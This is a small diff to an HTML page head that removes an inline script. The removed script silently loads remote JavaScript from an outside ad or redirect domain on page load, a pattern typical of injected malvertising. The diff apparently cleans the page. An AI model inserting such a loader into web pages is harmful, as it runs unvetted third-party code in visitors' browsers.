@@ -26,5 +26,4 @@
 
     gtag('config', 'G-0T82Y59VYL');
     </script>
-    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9394159,document.createElement('script'))</script>
 </head>
